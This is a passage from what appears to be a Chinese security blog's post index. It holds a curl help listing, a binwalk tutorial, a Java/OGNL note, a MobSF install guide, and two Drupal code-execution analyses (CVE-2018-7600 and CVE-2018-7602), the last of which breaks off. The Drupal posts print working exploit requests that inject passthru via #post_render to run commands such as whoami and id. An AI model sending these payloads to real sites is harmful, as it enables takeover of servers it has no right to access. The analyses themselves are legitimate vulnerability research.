URL path --pinnedpubkey FILE/HASHES Public key to verify peer against (SSL) --post301 Do not switch to GET after following a 301 redirect (H) --post302 Do not switch to GET after following a 302 redirect (H) --post303 Do not switch to GET after following a 303 redirect (H) --preproxy [PROTOCOL://]HOST[:PORT] Proxy before HTTP(S) proxy -#, --progress-bar Display transfer progress as a progress bar --proto PROTOCOLS Enable/disable PROTOCOLS --proto-default PROTOCOL Use PROTOCOL for any URL missing a scheme --proto-redir PROTOCOLS Enable/disable PROTOCOLS on redirect -x, --proxy [PROTOCOL://]HOST[:PORT] Use proxy on given port --proxy-anyauth Pick \"any\" proxy authentication method (H) --proxy-basic Use Basic authentication on the proxy (H) --proxy-digest Use Digest authentication on the proxy (H) --proxy-cacert FILE CA certificate to verify peer against for proxy (SSL) --proxy-capath DIR CA directory to verify peer against for proxy (SSL) --proxy-cert CERT[:PASSWD] Client certificate file and password for proxy (SSL) --proxy-cert-type TYPE Certificate file type (DER/PEM/ENG) for proxy (SSL) --proxy-ciphers LIST SSL ciphers to use for proxy (SSL) --proxy-crlfile FILE Get a CRL list in PEM format from the given file for proxy --proxy-insecure Allow connections to SSL sites without certs for proxy (H) --proxy-key KEY Private key file name for proxy (SSL) --proxy-key-type TYPE Private key file type for proxy (DER/PEM/ENG) (SSL) --proxy-negotiate Use HTTP Negotiate (SPNEGO) authentication on the proxy (H) --proxy-ntlm Use NTLM authentication on the proxy (H) --proxy-header LINE Pass custom header LINE to proxy (H) --proxy-pass PASS Pass phrase for the private key for proxy (SSL) --proxy-ssl-allow-beast Allow security flaw to improve interop for proxy (SSL) --proxy-tlsv1 Use TLSv1 for proxy (SSL) --proxy-tlsuser USER TLS username for proxy --proxy-tlspassword STRING TLS password for proxy --proxy-tlsauthtype STRING TLS authentication type for proxy (default SRP) --proxy-service-name NAME SPNEGO proxy service name --service-name NAME SPNEGO service name -U, --proxy-user USER[:PASSWORD] Proxy user and password --proxy1.0 HOST[:PORT] Use HTTP/1.0 proxy on given port -p, --proxytunnel Operate through a HTTP proxy tunnel (using CONNECT) --pubkey KEY Public key file name (SSH) -Q, --quote CMD Send command(s) to server before transfer (F/SFTP) --random-file FILE File for reading random data from (SSL) -r, --range RANGE Retrieve only the bytes within RANGE --raw Do HTTP \"raw\"; no transfer decoding (H) -e, --referer Referer URL (H) -J, --remote-header-name Use the header-provided filename (H) -O, --remote-name Write output to a file named as the remote file --remote-name-all Use the remote file name for all URLs -R, --remote-time Set the remote file's time on the local output -X, --request COMMAND Specify request command to use --resolve HOST:PORT:ADDRESS Force resolve of HOST:PORT to ADDRESS --retry NUM Retry request NUM times if transient problems occur --retry-connrefused Retry on connection refused (use with --retry) --retry-delay SECONDS Wait SECONDS between retries --retry-max-time SECONDS Retry only within this period --sasl-ir Enable initial response in SASL authentication -S, --show-error Show error. With -s, make curl show errors when they occur -s, --silent Silent mode (don't output anything) --socks4 HOST[:PORT] SOCKS4 proxy on given host + port --socks4a HOST[:PORT] SOCKS4a proxy on given host + port --socks5 HOST[:PORT] SOCKS5 proxy on given host + port --socks5-hostname HOST[:PORT] SOCKS5 proxy, pass host name to proxy --socks5-gssapi-service NAME SOCKS5 proxy service name for GSS-API --socks5-gssapi-nec Compatibility with NEC SOCKS5 server -Y, --speed-limit RATE Stop transfers below RATE for 'speed-time' secs -y, --speed-time SECONDS Trigger 'speed-limit' abort after SECONDS (default: 30) --ssl Try SSL/TLS (FTP, IMAP, POP3, SMTP) --ssl-reqd Require SSL/TLS (FTP, IMAP, POP3, SMTP) -2, --sslv2 Use SSLv2 (SSL) -3, --sslv3 Use SSLv3 (SSL) --ssl-allow-beast Allow security flaw to improve interop (SSL) --ssl-no-revoke Disable cert revocation checks (WinSSL) --stderr FILE Where to redirect stderr (use \"-\" for stdout) --tcp-nodelay Use the TCP_NODELAY option --tcp-fastopen Use TCP Fast Open -t, --telnet-option OPT=VAL Set telnet option --tftp-blksize VALUE Set TFTP BLKSIZE option (must be &gt;512) --tftp-no-options Do not send TFTP options requests -z, --time-cond TIME Transfer based on a time condition -1, --tlsv1 Use &gt;= TLSv1 (SSL) --tlsv1.0 Use TLSv1.0 (SSL) --tlsv1.1 Use TLSv1.1 (SSL) --tlsv1.2 Use TLSv1.2 (SSL) --tlsv1.3 Use TLSv1.3 (SSL) --trace FILE Write a debug trace to FILE --trace-ascii FILE Like --trace, but without hex output --trace-time Add time stamps to trace/verbose output --tr-encoding Request compressed transfer encoding (H) -T, --upload-file FILE Transfer FILE to destination --url URL URL to work with -B, --use-ascii Use ASCII/text transfer -u, --user USER[:PASSWORD] Server user and password --tlsuser USER TLS username --tlspassword STRING TLS password --tlsauthtype STRING TLS authentication type (default: SRP) --unix-socket PATH Connect through this Unix domain socket --abstract-unix-socket PATH Connect to an abstract Unix domain socket -A, --user-agent STRING Send User-Agent STRING to server (H) -v, --verbose Make the operation more talkative -V, --version Show version number and quit -w, --write-out FORMAT Use output FORMAT after completion --xattr Store metadata in extended file attributes -q, --disable Disable .curlrc (must be first parameter)","link":"/2018/01/27/2018/Curl%E5%B8%AE%E5%8A%A9%E6%96%87%E6%A1%A3/"},{"title":"binwalk使用教程","text":"Binwalk是CTF神器，不解释 0x00 Binwalk介绍Binwalk是用于搜索给定二进制镜像文件以获取嵌入的文件和代码的工具。 具体来说，它被设计用于识别嵌入固件镜像内的文件和代码。 Binwalk使用libmagic库，因此它与Unix文件实用程序创建的魔数签名兼容。 Binwalk还包括一个自定义魔数签名文件，其中包含常见的诸如压缩/存档文件，固件头，Linux内核，引导加载程序，文件系统等的固件映像中常见文件的改进魔数签名。 0x01 功能一个固件分析工具 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465root@kali:~# binwalk -hBinwalk v2.1.1Craig Heffner，http://www.binwalk.org用法：binwalk [选项] [文件1] [文件2] [文件3] ...扫描选项： -B，-- signature 扫描目标文件的常见文件签名 -R，--raw = &lt;str&gt; 扫描目标文件的指定字符序列 -A，--opcodes 扫描目标文件中常见可执行代码 -m，--magic = &lt;file&gt; 指定要使用的自定义魔数签名文件 -b，--dumb 禁用智能签名关键字 -I，--invalid 显示结果标记为无效 -x，--exclude = &lt;str&gt; 排除与&lt;str&gt;匹配的结果 -y，--include = &lt;str&gt; 只显示匹配&lt;str&gt;的结果提取选项： -e，--extract 自动提取已知的文件类型 -D，--dd = &lt;type：ext：cmd&gt; 提取&lt;type&gt;签名，为文件扩展名为&lt;ext&gt;，然后执行&lt;cmd&gt; -M，--matryoshka 递归扫描提取的文件 -d，--depth = &lt;int&gt; 限制matryoshka递归深度（默认值：8级深） -C，--directory = &lt;str&gt; 将文件/文件夹提取到自定义目录（默认值：当前工作目录） -j，--size = &lt;int&gt; 限制每个提取的文件的大小 -n，--count = &lt;int&gt; 限制提取文件的数量 -r，--rm 提取后删除刻录文件 -z，--carve 从文件中读取数据，但不执行提取实用程序熵分析选项： -E，--entropy 计算文件熵 -F，--fast 计算更快，但不太详细的熵分析 -J，--save 将熵图保存为PNG图像 -Q，--nlegend 从熵图图中省略图例 -N，--nplot 不生成熵图 -H，--high = &lt;float&gt; 设置上升沿熵触发阈值（默认值：0.95） -L，--low = &lt;float&gt; 设置下降沿熵触发阈值（默认值：0.85）原始压缩选项： -X， --deflate 扫描原始deflate压缩流 -Z， --lzma 扫描原始LZMA压缩流 -P， --partial 浅度扫描，速度更快 -S， --stop 找到第一个结果后停止扫描二进制差异选项： -W，--hexdump 执行文件或文件的hexdump/diff -G，--green 只显示包含所有文件中相同字节的行 -i，--red 仅显示包含所有文件中不同字节的行 -U，--blue 只显示一些文件中包含不同字节的行 -w，--terse 只显示第一个文件的十六进制转储一般选项： -l，--length = &lt;int&gt; 要扫描的字节数 -o，--offset = &lt;int&gt; 以此偏移开始扫描 -O，--base = &lt;int&gt; 向所有打印的偏移量添加基址 -K，--block = &lt;int&gt; 设置文件块大小 -g，--swap = &lt;int&gt; 扫描前每n个字节反转一次 -f，--log = &lt;file&gt; 将结果记录到文件 -c，--csv 将结果记录到CSV格式的文件中 -t，--term 格式化输出以适合终端窗口 -q，--quiet 禁止输出 -v，--verbose 详细输出 -h，--help 显示帮助 -a，--finclude = &lt;str&gt; 只扫描名称与此正则表达式匹配的文件 -p，--fexclude = &lt;str&gt; 不扫描名称与此正则表达式匹配的文件 -s，--status = &lt;int&gt; 启用指定端口上的状态服务器 0x02 用法示例在给定的固件文件（dd-wrt.v24-13064_VINT_mini.bin）上运行文件签名扫描（-B）： 12345678root@kali:~# binwalk -B dd-wrt.v24-13064_VINT_mini.binDECIMAL HEX DESCRIPTION-------------------------------------------------------------------------------------------------------------------0 0x0 TRX firmware header, little endian, header size: 28 bytes, image size: 2945024 bytes, CRC32: 0x4D27FDC4 flags: 0x0, version: 128 0x1C gzip compressed data, from Unix, NULL date: Wed Dec 31 19:00:00 1969, max compression2472 0x9A8 LZMA compressed data, properties: 0x6E, dictionary size: 2097152 bytes, uncompressed size: 2084864 bytes622592 0x98000 Squashfs filesystem, little endian, DD-WRT signature, version 3.0, size: 2320835 bytes, 547 inodes, blocksize: 131072 bytes, created: Mon Nov 2 07:24:06 2009","link":"/2016/02/27/2016/binwalk%E5%B8%AE%E5%8A%A9%E6%96%87%E6%A1%A3/"},{"title":"Drupal CVE2018-7602","text":"乘热打铁，再分析一波Drupal CVE-2018-7602 Drupal CVE-2018-7602这里我还是使用 Drupal7作为实验对象。这次和之前Drupal7版本的CVE-2018-7600漏洞思路类似，只是漏洞入口点不一样，具体步骤为先将恶意代码存储到数据库中，再通过这次的问题出在删除文章的时候执行数据库中的恶意代码。 这次我们的漏洞执行点还是之前的为drupal_render，而数据库存储点在form_set_cache($form['#build_id'], $form, $form_state); 通过Drupal CVE-2018-7600 我们可以知道drupal表单是通过drupal_process_form函数进行处理的，我们来审计一下程序是如何运行，通过审计我们截取以下片段，在下面的代码中，我们可以看到在drupal_process_form函数下的drupal_rebuild_form中有执行缓存表单数据的函数form_set_cache，这里两个条件判断，只要我们满足这个条件即可存储表单数据。 123456789101112-&gt; function drupal_process_form ... 969 if (($form_state['rebuild'] || !$form_state['executed']) &amp;&amp; !form_get_errors()) { $form_state['rebuild'] = TRUE; $form = drupal_rebuild_form($form_id, $form_state, $form); }-&gt; function drupal_rebuild_form -&gt; ... if (empty($form_state['no_cache'])) { form_set_cache($form['#build_id'], $form, $form_state); // 缓存到数据库中 } 而在代码中，rebuild的值不可控，但有一处是这样的， 12345678910// --------------- $form_state['submitted'] = false-&gt; function drupal_process_form ... 902 if ($form_state['submitted'] &amp;&amp; !form_get_errors() &amp;&amp; !$form_state['rebuild']) { ... $form_state['executed'] = TRUE; drupal_redirect_form($form_state); // 重定向到新的页面// --------------- $form_state['submitted'] = false // --------------- $form_state['executed'] = TRUE 这里将$form_state['executed']置为TRUE了，而如果我们能制止($form_state['submitted'] &amp;&amp; !form_get_errors() &amp;&amp; !$form_state['rebuild'])这个通过。我们再翻阅上面的代码，看看$form_state在哪里初始化的，看看能不能控制它的值。在886行，如下 123-&gt; function drupal_process_form ... 886 $form = form_builder($form_id, $form, $form_state); 进入form_builder进行构造表单，存在这个$form_state['submitted'] = TRUE;，而能不能控制这个判断语句呢， 123456789-&gt; function form_builder ... if (!empty($element['#input'])) { _form_builder_handle_input_element($form_id, $element, $form_state); } ... if (!empty($form_state['triggering_element']['#executes_submit_callback'])) { $form_state['submitted'] = TRUE; } 经过代码审计，我们发现这个$form_state['triggering_element']['#executes_submit_callback']与_form_builder_handle_input_element函数有初始化，代码如下 12345678910111213141516-&gt; function _form_builder_handle_input_element ... if (_form_element_triggered_scripted_submission($element, $form_state)) { $form_state['triggering_element'] = $element; }// ------------------------------ 输入要求 -------------------------------&gt; function _form_element_triggered_scripted_submission($element, &amp;$form_state) { if (!empty($form_state['input']['_triggering_element_name']) &amp;&amp; $element['#name'] == $form_state['input']['_triggering_element_name']) { if (empty($form_state['input']['_triggering_element_value']) || $form_state['input']['_triggering_element_value'] == $element['#value']) { return TRUE; } } return FALSE;} 这里我们需要满足条件$form_state['input']['_triggering_element_name']不为空、 $element['#name']等于$form_state['input']['_triggering_element_name'] 且$form_state['input']['_triggering_element_value'] 等于$element['#value']，经过调试我们可以发现，等于form_id即可。 这样我们就可以使得$form_state['executed']为FALSE，然后即可缓存数据到数据库中。 12345----&gt; 存储到数据库$form_state['executed'] == false 或 $form_state['submitted'] == trueempty($form_state['no_cache']) = true; POST中添加参数 _triggering_element_name=form_id 即可插入数据库中. 我们可以去查看插入数据库中的值。 1234567891011121314POST /cve-drupal-7.57/?q=node/7/delete&amp;destination=a?q[%2523post_render][]=passthru%26q[%2523type]=markup%26q[%2523markup]=whoami HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://127.0.0.1/cve-drupal-7.57/node/7/delete?destination=node&amp;render=overlayCookie: Drupal.toolbar.collapsed=0; Hm_lvt_4674b425370d9f190347b297042ae0b1=1533953538; PHPSESSID=gpgrkff5viorrpo0p31sq30tu4; has_js=1; SESSf099c1bc5e00739be0fb2d18719a6a09=tg9ei_SSoOYiBfedu5wEB5Oikgd8dpnd9e-HcCKCu74Connection: closeUpgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedContent-Length: 198confirm=1&amp;form_build_id=form-d-15RSo0BXQQaaxMDZMLrp__cgMvr0Ws0H0gmLeTPU&amp;form_token=9nKWgPYA7CLkLHogXMclmZ8-5gKNvBolD6QioQMhzHk&amp;form_id=node_delete_confirm&amp;op=Delete&amp;_triggering_element_name=form_id 再送一个如下数据包，其中恶意参数插入在destination中 1234567891011121314POST /cve-drupal-7.57/?q=file/ajax/actions/cancel/%23options/path/form-d-15RSo0BXQQaaxMDZMLrp__cgMvr0Ws0H0gmLeTPU HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://127.0.0.1/cve-drupal-7.57/node/7/delete?destination=node&amp;render=overlayCookie: Drupal.toolbar.collapsed=0; Hm_lvt_4674b425370d9f190347b297042ae0b1=1533953538; PHPSESSID=gpgrkff5viorrpo0p31sq30tu4; has_js=1; SESSf099c1bc5e00739be0fb2d18719a6a09=tg9ei_SSoOYiBfedu5wEB5Oikgd8dpnd9e-HcCKCu74Connection: closeUpgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedContent-Length: 62form_build_id=form-d-15RSo0BXQQaaxMDZMLrp__cgMvr0Ws0H0gmLeTPU 接收函数代码如下 123456789function node_form_delete_submit($form, &amp;$form_state) { $destination = array(); if (isset($_GET['destination'])) { $destination = drupal_get_destination(); unset($_GET['destination']); } $node = $form['#node']; $form_state['redirect'] = array('node/' . $node-&gt;nid . '/delete', array('query' =&gt; $destination)); // 未经过滤} 直接从 get 方法直接接收参数destination，而如何能够再由drupal_parse_url()方法对 url 进行 注入以后，我们还是通过file_ajax_upload进行执行。 12345678910111213function file_ajax_upload() { ... if (isset($form['#file_upload_delta']) &amp;&amp; $current_file_count &lt; $form['#file_upload_delta']) { $form[$current_file_count]['#attributes']['class'][] = 'ajax-new-content'; } // Otherwise just add the new content class on a placeholder. else { $form['#suffix'] .= '&lt;span class=\"ajax-new-content\"&gt;&lt;/span&gt;'; } $form['#prefix'] .= theme('status_messages'); $output = drupal_render($form); // &lt;---- 熟悉的漏洞执行点 $js = drupal_add_js(); $settings = drupal_array_merge_deep_array($js['settings']['data']); 而由于CVE-2018-7600的修复补丁会过滤掉#， 过滤我们构造恶意代码时，进行两次URL编码，而它在过滤的时候解码一次，而后面代码如何执行是由于由drupal_parse_url()方法对 url 进行处理之后，会解码第二层，之后代码变为 123q[%2523post_render] -&gt; q[#post_render][]q[%2523type] -&gt; q[#type]q[%2523markup] -&gt; markup&amp;q[#markup] 我们即可远程代码执行。","link":"/2018/08/06/2018/Drupal%20CVE2018-7602/"},{"title":"Java字符串对比","text":"在S2-002中，我们都知道用unicode编码绕过S2-001的安全策略，也涉及部分Java字符串操作的细节。 实验在Java中，字符串操作时，会将unicode字符解码再此操作，我们看以下代码： 123456789public class test { public static void main(String[] args) throws OgnlException { String s1 = \"aaa#\"; String s2 = \"aaa\\u0023\"; System.out.println(s1 + \" | \" + s2); System.out.println(s1.equals(s2)); System.out.println(s1==s2); }} 输出结果： 123aaa# | aaa#truetrue 而当我们输入unicode编码时呢，自然是会对其转义 如 \\u0023 转为 \\\\u0023 而ognl对\\\\u0023类似这种的字符会如何解析，看以下代码： 123456789101112131415import java.util.HashMap;import java.util.Scanner;import ognl.Ognl;import ognl.OgnlException;public class test { public static void main(String[] args) throws OgnlException { Scanner cin = new Scanner(System.in); String s3 = cin.nextLine(); System.out.println(s3); System.out.println(s3.equals(\"1+1\")); System.out.println(Ognl.getValue(s3, new HashMap&lt;&gt;(), \"\")); cin.close(); }} 终端： 12341\\u002b11\\u002b1false2 总结 Java操作字符串时的转义问题 ognl表达式对字符的操作(其实这里可以深挖一下)","link":"/2018/08/31/2018/Java%E5%AD%97%E7%AC%A6%E6%AF%94%E5%AF%B9/"},{"title":"MobSF安装教程","text":"MobSF是一款功能超强的安卓渗透工具，也是白老师的极力推荐，就是部署的时候会遇到很多BUG，本文记录配置的整个过程。 更新软件源 通过官方文档我们可以看到需要Python3、Jdk8、Sqlite3版本，所以我们先将软件源添加到apt仓库中，在此之前我们需要安装软件源添加工具包。 12345sudo apt-get updatesudo apt-get install software-properties-commonsudo add-apt-repository ppa:webupd8team/javasudo add-apt-repository ppa:jonathonf/python-3.6sudo apt-get update 安装依赖库 再安装sqlite3、jdk8、Python3、pip3，以及我们需要用来拉去MobSF源码的git工具 1234567891011$ sudo apt install -y build-essential libssl-dev libffi-dev libxml2-dev libxslt1-dev# 安装 sqlite3$ sudo apt install -y sqlite3 fontconfig-config libjpeg-turbo8 fontconfig xorg xfonts-75dpi# 安装 git$ sudo apt install -y git# 安装 jdk1.8$ sudo apt-get install oracle-java8-installer -y# 安装 python3.6$ sudo apt install -y python3.6 python3-dev python3-setuptools # 安装 pip$ python3 /usr/lib/python3/dist-packages/easy_install.py pip 下载源文件 使用git拉取MobSF源文件，然后执行必要的安装shell脚本.kali_fix.sh。 1234# 下载MobSF源文件$ git clone https://github.com/MobSF/Mobile-Security-Framework-MobSF.git$ cd Mobile-Security-Framework-MobSF$ sudo ./scripts/kali_fix.sh 我们通过工具virtualenv实现Python库的环境隔离，这里隔离名称为mobsf_py3，然后进入隔离的环境安装所需依赖包。 1234$ sudo pip3 install virtualenv$ virtualenv -p python3.6 mobsf_py3$ source mobsf_py3/bin/activate$ pip3 install -r requirements.txt 到此环境安装完毕。 执行源文件 通过source [空间名称]/bin/activate进入隔离空间，然后通过python3 manage.py runserver [ip:port]来启动MobSF就可以开心地开始渗透APP了。 以下实例的 空间名称为 mobsf_py3 ip为：192.168.1.200 端口为：8000 12$ source mobsf_py3/bin/activate$ python3 manage.py runserver 192.168.1.200:8000 访问页面如下 后台显示如下 未完待续…….","link":"/2018/10/10/2018/MobSF%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B/"},{"title":"CVE-2018-7600 Drupal 代码执行漏洞分析","text":"分析一波Drupal CVE-2018-7600 把这两个漏洞疏通疏通，因为7比较难，这里8的出现是为较详细地解释7版本 Drupal8 攻击思路先说一下这个漏洞的起因，由于Drupal渲染HTML时调用的是call_user_func和call_user_func_array两个十分危险的函数，而且渲染时传入的参数并未进行严格的过滤。 其次，这个参数在注册点处可控。 那么，接下来带大家看看执行点与操控点。 执行点首先，我们先看一下远程代码执行点。通过查阅Drupal的代码和文档，可以知道Drupal Render API对于请求中存在#开头的参数会进行特殊处理。 123456789101112131415161718192021# 链接 https://www.drupal.org/docs/8/api/form-api/form-render-elementsHTML5 Form Render ElementsThe HTML5 elements are:'#type' =&gt; 'tel''#type' =&gt; 'email''#type' =&gt; 'number''#type' =&gt; 'date''#type' =&gt; 'url''#type' =&gt; 'search''#type' =&gt; 'range'Using these elements as opposed to requesting data in plain textfields is preferable because devices can pull up the proper input methods for them, such as when a telephone number is requested, a keypad screen would display on a device.Other useful render elementsdetails: The '#type' =&gt; 'details' element is a grouping element with a summary.language_select: The '#type' =&gt; 'language_select' element is a language selector to make it easy to put language configuration on forms.dropbutton: The '#type' =&gt; 'dropbutton' provides a generic select list with a dropbutton. See also the '#type' =&gt; 'operations' element.operations: The '#type' =&gt; 'operations' element provides a list of available operations, which you can commonly find in entity configuration administrative screens, such as at admin/structure/types.Other entities with autocomplete: The '#type' =&gt; 'entity_autocomplete' element allow to select an entity of a specific type.Check out namespace Drupal\\Core\\Render\\Element for all the core provided elements. 然后我们看看渲染参数的执行渲染过程， 在Drupal 中\\core\\lib\\Druple\\Core\\Render\\Render.php中的函数doRender， 12protected function doRender(&amp;$elements, $is_root_call = FALSE) { ... 一大段初始化处理代码我们先放一边，后面有一段对特殊参数处理的代码片段如下，首先是对渲染数组进行过滤， 1234567891011121314151617 $supported_keys = [ '#lazy_builder', '#cache', '#create_placeholder', // The keys below are not actually supported, but these are added // automatically by the Renderer. Adding them as though they are // supported allows us to avoid throwing an exception 100% of the time. '#weight', '#printed' ]; $unsupported_keys = array_diff(array_keys($elements), $supported_keys); # array_diff — 计算数组的差集，返回一个数组，该数组包括了所有在 array1 中但是不在任何其它参数数组中的值。注意键名保留不变。 # count — 计算数组中的单元数目，返回 array_or_countable 中的单元数目。 如果参数既不是数组，也不是实现 Countable 接口的对象，将返回 1。 有个例外：如果 array_or_countable 是 NULL 则结果是 0。 if (count($unsupported_keys)) { throw new \\DomainException(sprintf('When a #lazy_builder callback is specified, no properties can exist; all properties must be generated by the #lazy_builder callback. You specified the following properties: %s.', implode(', ', $unsupported_keys))); }} 其中红线框起来的这部分，这里这个$supported_keys是Drupal会进行特殊渲染的key值， 当然开发文档中表示如果给的这些值不够可以自己进行添加。 如果有渲染数组与$supported_keys的key值有差异，将抛出异常。我们继续往下看会发现有比较吸引我们的函数call_user_func和call_user_func_array。执行代码如下。 123456789if (isset($elements['#post_render'])) { foreach ($elements['#post_render'] as $callable) { if (is_string($callable) &amp;&amp; strpos($callable, '::') === FALSE) { $callable = $this-&gt;controllerResolver-&gt;getControllerFromDefinition($callable); } $elements['#children'] = call_user_func($callable, $elements['#children'], $elements); # call_user_func,将第一个参数作为回调函数，后续参数为该函数的参数. }} 我们再往上看看#children的值的来源： 12345678910111213141516171819202122232425262728293031323334if (!isset($elements['#children'])) { $elements['#children'] = '';# 看这里}...if ($theme_is_implemented &amp;&amp; !isset($elements['#render_children'])) { $elements['#children'] = $this-&gt;theme-&gt;render($elements['#theme'], $elements);# 看这里 $theme_is_implemented = ($elements['#children'] !== FALSE);}if ((!$theme_is_implemented || isset($elements['#render_children'])) &amp;&amp; empty($elements['#children'])) { foreach ($children as $key) { $elements['#children'] .= $this-&gt;doRender($elements[$key]);# 看这里 } $elements['#children'] = Markup::create($elements['#children']);# 看这里}if (!$theme_is_implemented &amp;&amp; isset($elements['#markup'])) { $elements['#children'] = Markup::create($elements['#markup'] . $elements['#children']);# 看这里} if (isset($elements['#theme_wrappers']) &amp;&amp; !isset($elements['#render_children'])) { foreach ($elements['#theme_wrappers'] as $key =&gt; $value) { $wrapper_elements = $elements; if (is_string($key)) { $wrapper_hook = $key; foreach ($value as $attribute =&gt; $override) { $wrapper_elements[$attribute] = $override; } } else { $wrapper_hook = $value; } $elements['#children'] = $this-&gt;theme-&gt;render($wrapper_hook, $wrapper_elements);# 看这里 }} 我们发现，首先存在#markup，我们只要防止#theme_wrappers的干扰即可。 到这里，如果$elements['#children']的值与$elements['#post_render']可控，或者说$elements的值可控，我们就有一个必杀点，进而实现远程代码执行。 操控点现在我们需要找一个突破点去控制$elements的值。 通过审计可以发现在Drupal8.5.0的注册处存在一个的操控点能够注入渲染数组，漏洞文件位于\\core\\modules\\file\\src\\Element\\ManagedFile.php中，代码如下： 1234public static function uploadAjaxCallback(&amp;$form, FormStateInterface &amp;$form_state, Request $request) { $renderer = \\Drupal::service('renderer'); $form_parents = explode('/', $request-&gt;query-&gt;get('element_parents'));# 第一处 $form = NestedArray::getValue($form, $form_parents);# 第二处 代码中第一处划线处代码，接收请求中的参数，第二处划线为取出$GET[&quot;element_parents&quot;]中的值赋给$form_parents，然后我们跟进NestedArray::getValue函数，getValue代码如下， 123456789101112131415public static function &amp;getValue(array &amp;$array, array $parents, &amp;$key_exists = NULL) { $ref = &amp;$array; foreach ($parents as $parent) { if (is_array($ref) &amp;&amp; (isset($ref[$parent]) || array_key_exists($parent, $ref))) { $ref = &amp;$ref[$parent]; } else { $key_exists = FALSE; $null = NULL; return $null; } } $key_exists = TRUE; return $ref;} 其主要功能是将$array中$parents有的键逐一传入$ref中，如果存在没有的键，返回空。那么我们继续往下看 123456789101112131415161718public static function uploadAjaxCallback(&amp;$form, FormStateInterface &amp;$form_state, Request $request) { ... $current_file_count = $form_state-&gt;get('file_upload_delta_initial'); if (isset($form['#file_upload_delta']) &amp;&amp; $current_file_count &lt; $form['#file_upload_delta']) { $form[$current_file_count]['#attributes']['class'][] = 'ajax-new-content'; } else { $form['#suffix'] .= '&lt;span class=\"ajax-new-content\"&gt;&lt;/span&gt;'; } $status_messages = ['#type' =&gt; 'status_messages']; $form['#prefix'] .= $renderer-&gt;renderRoot($status_messages); $output = $renderer-&gt;renderRoot($form);# 执行点 $response = new AjaxResponse(); $response-&gt;setAttachments($form['#attached']); return $response-&gt;addCommand(new ReplaceCommand(NULL, $output));} 继续跟进renderRoot 12345678910111213141516public function renderRoot(&amp;$elements) { // Disallow calling ::renderRoot() from within another ::renderRoot() call. if ($this-&gt;isRenderingRoot) { $this-&gt;isRenderingRoot = FALSE; throw new \\LogicException('A stray renderRoot() invocation is causing bubbling of attached assets to break.'); } // Render in its own render context. $this-&gt;isRenderingRoot = TRUE; $output = $this-&gt;executeInRenderContext(new RenderContext(), function () use (&amp;$elements) { return $this-&gt;render($elements, TRUE); # 执行点 }); $this-&gt;isRenderingRoot = FALSE; return $output;} 长驱直入 123456789public function render(&amp;$elements, $is_root_call = FALSE) { try { return $this-&gt;doRender($elements, $is_root_call); # 执行点 } catch (\\Exception $e) { $this-&gt;isRenderingRoot = FALSE; throw $e; }} 直捣黄龙 123# 我们熟悉的执行点protected function doRender(&amp;$elements, $is_root_call = FALSE) { ... 到这一步，我们发现一个类似render的名字，然后我们一路跟进，发现果然这里最后调用了doRrender并且将请求中的数据传入$elements，这使得我们第一步发现的代码执行的渲染数组$elements数组可控。 最后我们总结以下思路如下： 在Render.php中存在代码执行点，可利用的执行函数为call_user_func，函数将第一个参数作为回调函数调用，回调函数为$elements['#post_render']的值，其他参数为$elements['#children']和$elements数组，而在ManagedFile.php处可以通过请求注入参数到$elements中执行. 123456789101112POST /user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax HTTP/1.1Host: 0.0.0.0:8080User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateConnection: keep-aliveUpgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedContent-Length: 105form_id=user_register_form&amp;_drupal_ajax=1&amp;mail[#post_render][]=passthru&amp;mail[#type]=balabala&amp;mail[#markup]=id 通过#post_render注入回调函数passthru，通过#markup注入passthru参数，这就是我们整个的攻击思路。其他参数的作用是调用Drupal的相关API返回渲染表单。 Drupal7 攻击思路由于7和8的差异，我调试了一下午才知晓这个漏洞的整个流程。 首先当发送一个请求时，drupal会先搜索一下数据库中是否存在你的表单记录的相关信息，What Fuck，记录? 1234567891011121314151617...&lt;form action=\"/cve-drupal-7.57/user/password\" method=\"post\" id=\"user-pass\" accept-charset=\"UTF-8\"&gt; &lt;div&gt; &lt;div class=\"form-item form-type-textfield form-item-name\"&gt; &lt;label for=\"edit-name\"&gt;Username or e-mail address &lt;span class=\"form-required\" title=\"This field is required.\"&gt;*&lt;/span&gt; &lt;/label&gt; &lt;input type=\"text\" id=\"edit-name\" name=\"name\" value=\"\" size=\"60\" maxlength=\"254\" class=\"form-text required\" /&gt; &lt;/div&gt; &lt;input type=\"hidden\" name=\"form_build_id\" value=\"form-Nm50BrT2ih7pO_eBKy1-8Rgn70g4qz2CaWUK43MmVEY\" /&gt; &lt;!-- 看这里的左边 --&gt; &lt;input type=\"hidden\" name=\"form_id\" value=\"user_pass\" /&gt; &lt;div class=\"form-actions form-wrapper\" id=\"edit-actions\"&gt; &lt;input type=\"submit\" id=\"edit-submit\" name=\"op\" value=\"E-mail new password\" class=\"form-submit\" /&gt; &lt;/div&gt; &lt;/div&gt;&lt;/form&gt; ... 通过查看网页源代码可以发现如上代码中ID号form-Nm50BrT2ih7pO_eBKy1-8Rgn70g4qz2CaWUK43MmVEY，当在你打开drupal的修改密码的表单时，drupal会发送一个form的ID号。 如果ID号不存在，将会正常的执行业务，而且一般不会记录业务。 What ***K？那数据库中的记录是哪里来的。 如果ID号存在，将会执行以下代码 1234567891011121314151617if ($router_item) { // Allow modules to alter the router item before it is translated and // checked for access. drupal_alter('menu_get_item', $router_item, $path, 